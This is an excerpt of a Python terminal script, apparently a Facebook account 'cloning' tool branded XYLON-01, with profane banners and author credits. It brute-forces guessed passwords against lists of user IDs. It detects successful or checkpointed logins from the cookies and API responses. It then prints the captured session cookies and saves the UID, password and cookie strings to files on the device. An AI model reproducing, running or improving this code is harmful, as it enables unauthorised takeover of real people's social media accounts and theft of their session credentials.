...
jalan('\n\t>_ FUCKED BY - 🔰 XYLON ')
#jalan('\x1b[1;31mXYLON CYBER  XYLON-01 CLONING START PLEASE WAIT ..........')
time.sleep(3)
os.system('clear')
...
░░   ░▒ ░ ▓██ ░▒░ ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ...
 ░    ░   ░ ░         ░  ░    ░ ░           ░ 
          ░ ░                                                                        
     {H} ╔════════════════════════{M}════════════════╗
      {H}║{M}[{H}•{M}] AUTHOR    :{H} ABDULLHA🟡               {N}{M}║
      {H}║{M}[{H}•{M}] FACEBOOK  : {H}XYLON 🟡                {N}{M} ║
      {H}║{M}[{H}•{M}] GITHUB    : {H}XYLON-404{N}            {H}   ║
      {M}║{M}[{H}•{M}] STATUS    : {H}XYLON -XD{P}     {N}  {H}        ║
...
def main():
    os.system('clear')
    print('\n\n\n [😅] FUCK XYLON PUSSY & POM POM  - XYLON')
    time.sleep(4)
    os.system('clear')
    print(lol)
    print(f' ')
    
    print(f'{M}╔══[•] TOOL NAME : {H}XYLON')
    print(f'{M}║══[•] YOUR KEY  :{H} FUCKED BY - XYLON')#+key)
    print(f'{M}║══[•] VERSION   : {H}XYLON-01')
    print(f'{M}╚══[•] CODER NAME: {H}XYLON 🟡')
    print(f' ')
    print(f"{M}╔══[{M}1{RED}] \033[1;32mSTART XYLON-01  CLONING {RED}(TCW)")
...
def _xxx_():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}XYLON 🟡')
    print(f' ')
    print(f"{M}╔══[{M}1{RED}] \033[1;32mSTART XYLON-01  RANDOM {RED}(TCW)")
    print(f"{M}╔══[{M}2{RED}] \033[1;31mSTART XYLON-01  X GMAIL {RED}(TCW)")
...
def shbd():
    ...
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/XYLON/DOREMON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
...
def gmail():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}XYLON{P}][{B}MASUD{P}][{K}MAHIN{P}][{K}FAHIM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            shanto = random.choice(["\x1b[1;91mXYLON","\x1b[1;92mXYLON","\x1b[1;93mXYLON","\x1b[1;94mXYLON","\x1b[1;95mXYLON","\x1b[1;96mXYLON","\x1b[1;97mXYLON","\x1b[1;91mXYLON","\x1b[1;92mXYLON","\x1b[1;93mXYLON","\x1b[1;94mXYLON","\x1b[1;95mXYLON","\x1b[1;96mXYLON"])
...
#-------[ UP- 12/06/ XYLON ]---------
            ...
            if 'm_page_voice' in log_cookies:
                ...
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[XYLON-LOK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/XYLON-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
            elif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[XYLON-OK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/XYLON-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[XYLON-2F] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                      print(f'    {RED}[COOKI💉] {RED}'+coki)
                      open('/sdcard/XYLON-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
...
def n(uid,pwx,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mXYLON\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91mXYLON","\x1b[1;92mXYLON","\x1b[1;93mXYLON","\x1b[1;94mXYLON","\x1b[1;95mXYLON","\x1b[1;96mXYLON","\x1b[1;97mXYLON","\x1b[1;91mXYLON","\x1b[1;92mXYLON","\x1b[1;93mXYLON","\x1b[1;94mXYLON","\x1b[1;95mXYLON","\x1b[1;96mXYLON"])
...
#-----[ UPDATE GRAPH - 12/06 XYLON ]
            ...
            if 'access_token' in po:
                ...
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[XYLON-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/XYLON-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91mXYLON","\x1b[1;92mXYLON","\x1b[1;93mXYLON","\x1b[1;94mXYLON","\x1b[1;95mXYLON","\x1b[1;96mXYLON","\x1b[1;97mXYLON","\x1b[1;91mXYLON","\x1b[1;92mXYLON","\x1b[1;93mXYLON","\x1b[1;94mXYLON","\x1b[1;95mXYLON","\x1b[1;96mXYLON"])
            ...
            if 'access_token' in po:
                ...
                print('    \033[1;92m[XYLON-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/XYLON-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[XYLON-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/XYLON-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
